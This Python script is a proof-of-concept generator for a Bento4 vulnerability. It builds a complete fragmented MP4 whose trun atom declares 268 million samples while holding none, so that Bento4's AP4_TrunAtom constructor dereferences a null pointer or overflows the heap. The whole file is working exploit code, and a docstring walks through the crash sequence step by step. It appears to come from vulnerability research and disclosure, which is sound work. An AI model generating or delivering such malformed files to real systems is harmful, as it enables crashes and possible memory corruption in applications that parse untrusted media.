#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN 002:
AP4_TrunAtom Unvalidated sample_count -> Null Pointer Dereference / Heap Overflow

Constructs a minimal fragmented MP4 with a trun atom containing
sample_count = 0x10000000 (268 million) but actual atom size = 16 bytes
(no sample data). This causes OOM when trying to allocate 268M entries,
leaving m_Items as NULL, then the loop dereferences the NULL pointer.

CWE: CWE-476 / CWE-122
"""

import struct
import os

# Output path (same directory as this script)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "vuln_002.mp4")


def box(box_type, payload):
    """Build a basic box: size(4) + type(4) + payload"""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type.encode()) + payload


def fullbox(box_type, version, flags, payload):
    """Build a full box: size(4) + type(4) + version(1) + flags(3) + payload"""
    size = 12 + len(payload)
    header = struct.pack(">I4sBBBB", size, box_type.encode(), version,
                         (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF)
    return header + payload


def build_ftyp():
    """
    ftyp box:
      major_brand = 'iso5'
      minor_version = 0
      compatible_brands = ['iso5']
    Total: 8 + 4 + 4 + 4 = 20 bytes
    """
    payload = b'iso5'              # major_brand
    payload += struct.pack(">I", 0)  # minor_version
    payload += b'iso5'             # compatible brands
    return box('ftyp', payload)


def build_mvhd():
    """
    mvhd version=0 full box (108 bytes total):
      12 (header) + 96 (fields)
    """
    payload = struct.pack(">IIII", 0, 0, 1000, 0)   # creation, modification, timescale, duration
    payload += struct.pack(">I", 0x00010000)          # rate (1.0)
    payload += struct.pack(">H", 0x0100)              # volume (1.0)
    payload += b'\x00' * 10                           # reserved (2 + 8)
    # Identity matrix: {0x10000,0,0, 0,0x10000,0, 0,0,0x40000000}
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)                             # 36 bytes matrix
    payload += b'\x00' * 24                           # pre_defined (6 x 4 bytes)
    payload += struct.pack(">I", 2)                   # next_track_id
    return fullbox('mvhd', 0, 0, payload)


def build_tkhd():
    """
    tkhd version=0: 12 (header) + 80 (fields) = 92 bytes
    """
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)  # creation, modification, track_id, reserved, duration
    payload += b'\x00' * 8                            # reserved
    payload += struct.pack(">HH", 0, 0)              # layer, alternate_group
    payload += struct.pack(">HH", 0, 0)              # volume, reserved
    # Identity matrix
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)                             # 36 bytes
    payload += struct.pack(">II", 0, 0)              # width, height (fixed-point)
    return fullbox('tkhd', 0, 0x000001, payload)     # flags=1 = track_enabled


def build_mdhd():
    """
    mdhd version=0: 12 + 24 = 36 bytes
    """
    payload = struct.pack(">IIIII", 0, 0, 1000, 0, 0)  # creation, modification, timescale, duration, language+pre_defined
    return fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    """
    hdlr: 12 + 4 + 4 + 12 + 1 = 33 bytes minimal
    """
    payload = struct.pack(">I", 0)      # pre_defined
    payload += b'soun'                  # handler_type
    payload += b'\x00' * 12            # reserved (3 x 4)
    payload += b'\x00'                  # name (null-terminated empty string)
    return fullbox('hdlr', 0, 0, payload)


def build_smhd():
    """Sound media header: 12 + 4 = 16 bytes"""
    payload = struct.pack(">HH", 0, 0)  # balance, reserved
    return fullbox('smhd', 0, 0, payload)


def build_dref():
    """dref: data reference (just url() entry)"""
    url_entry = fullbox('url ', 0, 0x000001, b'')  # flags=1 means self-contained
    payload = struct.pack(">I", 1)                  # entry_count
    payload += url_entry
    return fullbox('dref', 0, 0, payload)


def build_dinf():
    return box('dinf', build_dref())


def build_stts():
    """stts: empty time-to-sample table"""
    payload = struct.pack(">I", 0)  # entry_count = 0
    return fullbox('stts', 0, 0, payload)


def build_stsc():
    """stsc: empty sample-to-chunk table"""
    payload = struct.pack(">I", 0)
    return fullbox('stsc', 0, 0, payload)


def build_stsz():
    """stsz: empty sample size table"""
    payload = struct.pack(">II", 0, 0)  # sample_size=0, sample_count=0
    return fullbox('stsz', 0, 0, payload)


def build_stco():
    """stco: empty chunk offset table"""
    payload = struct.pack(">I", 0)
    return fullbox('stco', 0, 0, payload)


def build_stsd():
    """stsd: empty sample description"""
    payload = struct.pack(">I", 0)  # entry_count = 0
    return fullbox('stsd', 0, 0, payload)


def build_stbl():
    data = build_stsd()
    data += build_stts()
    data += build_stsc()
    data += build_stsz()
    data += build_stco()
    return box('stbl', data)


def build_minf():
    data = build_smhd()
    data += build_dinf()
    data += build_stbl()
    return box('minf', data)


def build_mdia():
    data = build_mdhd()
    data += build_hdlr()
    data += build_minf()
    return box('mdia', data)


def build_trak():
    data = build_tkhd()
    data += build_mdia()
    return box('trak', data)


def build_trex():
    """
    trex: track extends default values
    12 (header) + 5*4 (fields) = 32 bytes
    """
    payload = struct.pack(">IIIII",
        1,   # track_ID
        1,   # default_sample_description_index
        0,   # default_sample_duration
        0,   # default_sample_size
        0)   # default_sample_flags
    return fullbox('trex', 0, 0, payload)


def build_mvex():
    return box('mvex', build_trex())


def build_moov():
    data = build_mvhd()
    data += build_trak()
    data += build_mvex()
    return box('moov', data)


def build_mfhd(sequence_number=1):
    """
    mfhd: movie fragment header
    12 + 4 = 16 bytes
    """
    payload = struct.pack(">I", sequence_number)
    return fullbox('mfhd', 0, 0, payload)


def build_tfhd(track_id=1):
    """
    tfhd: track fragment header with flags=0 (no optional fields)
    12 + 4 = 16 bytes
    """
    payload = struct.pack(">I", track_id)
    return fullbox('tfhd', 0, 0x000000, payload)


def build_trun_malicious():
    """
    Malicious trun: sample_count = 0x10000000 (268 million) but no actual sample data.

    flags = 0x000200 = AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT
      This means each sample has a 4-byte sample_size field.
      No data_offset (bit 0x001), no first_sample_flags (bit 0x004).

    Atom layout (16 bytes total):
      size(4) + 'trun'(4) + version(1) + flags(3) + sample_count(4) = 16 bytes

    Trigger sequence (with ASAN allocator_may_return_null=1):
      1. m_Entries.SetItemCount(0x10000000) -> EnsureCapacity tries to allocate
         0x10000000 * 16 = 4GB, ASAN returns NULL (allocator_may_return_null=1)
      2. EnsureCapacity: new_items==NULL -> return AP4_ERROR_OUT_OF_MEMORY
      3. SetItemCount returns OOM; m_Items stays NULL, m_ItemCount stays 0
      4. Constructor IGNORES return value, enters loop:
         for i in 0..0x10000000-1:
             if (flags & AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT):  # TRUE with flags=0x0200
                 stream.ReadUI32(m_Entries[i].sample_size)
                 -> m_Entries[i] -> m_Items[i] -> NULL[i] -> NULL PTR DEREFERENCE
    """
    MALICIOUS_SAMPLE_COUNT = 0x10000000  # 268,435,456

    # flags = 0x000200: AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT
    # This forces the loop to access m_Entries[i].sample_size on first iteration
    FLAGS = 0x000200

    payload = struct.pack(">I", MALICIOUS_SAMPLE_COUNT)  # sample_count
    # No optional fields (flags bit 0x001 and 0x004 are clear)
    # No per-sample data in the file (trun is only 16 bytes, but claims 268M samples)
    return fullbox('trun', 0, FLAGS, payload)


def build_traf():
    data = build_tfhd(track_id=1)
    data += build_trun_malicious()
    return box('traf', data)


def build_moof():
    data = build_mfhd(sequence_number=1)
    data += build_traf()
    return box('moof', data)


def build_mdat():
    """Minimal empty mdat box"""
    return box('mdat', b'')


def build_fragmented_mp4():
    data = build_ftyp()
    data += build_moov()
    data += build_moof()
    data += build_mdat()
    return data


if __name__ == "__main__":
    mp4_data = build_fragmented_mp4()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] trun sample_count = 0x10000000 ({0x10000000} samples)")
    print(f"[+] trun atom size = 16 bytes (header + sample_count only, no actual data)")
    print("[+] This should trigger CWE-476/CWE-122 in AP4_TrunAtom::AP4_TrunAtom()")
